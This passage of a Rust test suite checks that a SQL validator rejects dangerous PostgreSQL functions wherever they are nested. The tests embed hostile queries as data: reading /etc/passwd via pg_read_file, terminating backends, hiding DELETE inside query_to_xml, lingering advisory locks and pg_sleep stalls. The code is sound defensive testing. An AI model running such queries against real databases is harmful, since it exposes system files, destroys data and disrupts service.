                "case variant `{sql}` not blocked"
            );
        }
    }

    #[test]
    fn function_deny_list_walks_into_subqueries() {
        // A naive validator that only checks the top-level projection
        // would miss this. The visitor must walk subqueries too.
        let err = validate_sql(
            "SELECT * FROM users WHERE id IN (SELECT pg_terminate_backend(pid) FROM pg_stat_activity)",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_walks_into_cte_bodies() {
        // CTE body with a denied function. The CTE-mutation walker
        // checks for INSERT/UPDATE/DELETE; the function walker is
        // separate and must catch this too.
        let err = validate_sql(
            "WITH bad AS (SELECT pg_read_file('/etc/passwd') AS x) SELECT * FROM bad",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    /// E8 (2026-09): the SQL/XML family executes the SQL it is handed via
    /// SPI, inside a statement the walker classifies as a SELECT. Every
    /// member, bare and `pg_catalog`-qualified, in an expression AND as a
    /// FROM-clause table function.
    /// The worker-local list is a PIN on the canonical protocol list, not a
    /// supplement: the gate consults the protocol crate's lists only,
    /// so a name present here but absent there would be a silent gap on
    /// BOTH fences. This test makes that gap a red build.
    #[test]
    fn worker_supplement_is_in_the_canonical_list() {
        for f in super::WORKER_DISALLOWED_SQL_FUNCTIONS {
            assert!(
                talos_workflow_job_protocol::is_disallowed_sql_function(f),
                "{f} is named by the worker list but missing from \
                 talos_workflow_job_protocol::DISALLOWED_SQL_FUNCTIONS"
            );
        }
    }

    #[test]
    fn function_deny_list_covers_the_sql_xml_spi_family() {
        for f in super::WORKER_DISALLOWED_SQL_FUNCTIONS {
            let err = validate_sql(
                &format!("SELECT {f}('DELETE FROM users', true, false, '')"),
                &[],
            )
            .unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "{f} must be denied in an expression, got {err:?}"
            );
            let err = validate_sql(
                &format!("SELECT pg_catalog.{f}('DELETE FROM users', true, false, '')"),
                &[],
            )
            .unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "pg_catalog.{f} must be denied, got {err:?}"
            );
            let upper = f.to_ascii_uppercase();
            let err =
                validate_sql(&format!("SELECT {upper}('x', true, false, '')"), &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "{upper} (case-insensitive) must be denied, got {err:?}"
            );
        }
        // The nested-SPI shape the family exists for: a "read" that deletes.
        let err = validate_sql(
            "SELECT query_to_xml('DELETE FROM users', true, false, '') AS x",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
        // FROM-clause form.
        let err = validate_sql(
            "SELECT * FROM query_to_xml('DELETE FROM users', true, false, '')",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
        // Control: a listed function of the same shape still passes.
        assert!(validate_sql("SELECT concat('x', true, false, '')", &[]).is_ok());
    }

    /// Session state that outlives the guest's transaction: advisory locks
    /// (a SESSION lock survives COMMIT/ROLLBACK and rode the pooled connection
    /// back into the controller's pool) and large objects (persist in
    /// `pg_largeobject`). Denied by FAMILY prefix in the protocol matcher —
    /// `pg_advisory_lock`, `lo_create`, `lo_get` are deliberately NOT in the
    /// exact list, so every case here passes only while this walker routes
    /// through `talos_workflow_job_protocol::is_disallowed_sql_function`.
    #[test]
    fn function_deny_list_covers_the_session_state_families() {
        for sql in [
            "SELECT pg_advisory_lock(1)",
            "SELECT pg_try_advisory_xact_lock(1)",
            "SELECT lo_create(0)",
            // FROM-clause (set-returning) form: a TableFactor, not an Expr.
            "SELECT * FROM lo_get(1)",
            "SELECT * FROM pg_catalog.lo_get(1)",
            "SELECT pg_catalog.pg_advisory_lock(1)",
            "SELECT PG_ADVISORY_LOCK_SHARED(1, 2)",
            "SELECT Pg_Try_Advisory_Lock(1)",
            "SELECT lo_from_bytea(0, 'x'::bytea)",
            "SELECT loread(0, 1)",
            "SELECT lowrite(0, 'x'::bytea)",
            // One lock PER ROW, hidden in a predicate.
            "SELECT id FROM t WHERE pg_try_advisory_lock(id)",
            "WITH l AS (SELECT pg_advisory_lock(7)) SELECT * FROM l",
            "SELECT (SELECT (SELECT pg_advisory_lock(7)))",
            // A family member no current Postgres has: denied by the prefix.
            "SELECT pg_advisory_lock_timeout(1, 5)",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DisallowedFunction(_)),
                "`{sql}` must be refused as a disallowed function, got {err:?}"
            );
        }
        // The function walk runs before the allowlist, so granting the verb
        // does not re-admit the lock.
        let ops = vec!["DELETE".to_string()];
        let err = validate_sql("DELETE FROM t WHERE pg_try_advisory_lock(id)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
        // Controls: the real pg_catalog functions sharing a stem stay callable.
        for sql in [
            "SELECT lower(name), log(2.0), log10(100) FROM t",
            "SELECT lower_inc(int4range(1, 2)), lower_inf(int4range(1, 2))",
        ] {
            let result = validate_sql(sql, &[]);
            assert!(result.is_ok(), "`{sql}` was rejected: {result:?}");
        }
    }

    #[test]
    fn function_deny_list_walks_into_join_predicates() {
        // Join ON / WHERE / HAVING all reach via the visitor.
        let err =
            validate_sql("SELECT * FROM t1 JOIN t2 ON pg_sleep(60) IS NULL", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_walks_into_case_when() {
        // Deeply nested expressions — a future overly-shallow walker
        // would miss this. The visitor pattern is recursive by design.
        let err = validate_sql(
            "SELECT CASE WHEN id > 5 THEN pg_terminate_backend(id) ELSE 0 END FROM users",
            &[],
        )
        .unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_list_does_not_block_benign_functions() {
        // Sanity: the validator must NOT block common read-only or
        // arithmetic functions. If this test ever fails, the deny-list
        // has been over-broadened.
        for sql in [
            "SELECT count(*) FROM users",
            "SELECT sum(amount) FROM payments",
            "SELECT now()",
            "SELECT json_agg(t) FROM (SELECT * FROM users) t",
            "SELECT row_number() OVER (ORDER BY id) FROM events",
            "SELECT lower(name) || '@example.com' FROM users",
        ] {
            let result = validate_sql(sql, &[]);
            assert!(
                result.is_ok(),
                "benign SQL `{sql}` was rejected: {result:?}"
            );
        }
    }

    /// A function nobody has listed is refused — the point of an allow
    /// list. Under the deny list these were admitted.
    #[test]
    fn a_function_nobody_listed_is_refused() {
        for (sql, named) in [
            (
                "SELECT pg_my_custom_business_func(id) FROM t",
                "pg_my_custom_business_func",
            ),
            ("SELECT my_func(id) FROM t", "my_func"),
            (
                "SELECT * FROM my_set_returning_func(1)",
                "my_set_returning_func",
            ),
            ("SELECT xmlcomment('hi')", "xmlcomment"),
        ] {
            match validate_sql(sql, &[]).unwrap_err() {
                SqlValidationError::DisallowedFunction(name) => assert_eq!(name, named, "{sql}"),
                other => panic!("expected DisallowedFunction for `{sql}`, got {other:?}"),
            }
        }
    }

    #[test]
    fn function_deny_list_short_circuits_on_first_violation() {
        // Performance contract: the visitor stops at the first hit so
        // a deeply-nested malicious query doesn't pay the full walk.
        // We can't directly observe the short-circuit from the public
        // API, but we can pin that a violation deep in the AST still
        // produces a stable error (no panic on traversal continuation).
        let err = validate_sql("SELECT (SELECT (SELECT (SELECT pg_sleep(60))))", &[]).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn function_deny_runs_before_allowlist_check() {
        // Defense-in-depth ordering: even when the operator grants
        // SELECT, an attempt to call a denied function fails with
        // `DisallowedFunction`, NOT `DisallowedOperation`. This means
        // a SELECT-only module is also protected from the function
        // vector.
        let ops = vec![
            "SELECT".to_string(),
            "INSERT".to_string(),
            "UPDATE".to_string(),
        ];
        let err = validate_sql("SELECT pg_sleep(60)", &ops).unwrap_err();
        assert!(matches!(err, SqlValidationError::DisallowedFunction(_)));
    }

    #[test]
    fn disallowed_function_error_message_includes_function_name() {
        // Operator UX: the error string must name the function so the
        // operator can find it in their module source.
        let err = validate_sql("SELECT pg_sleep(60)", &[]).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("pg_sleep"),
            "error string must include function name, got `{msg}`"
        );
        assert!(
            msg.contains("deny-list")
                || msg.contains("denied")
                || msg.contains("rejected")
                || msg.contains("unconditional"),
            "error string must signal the denied status, got `{msg}`"
        );
    }
}
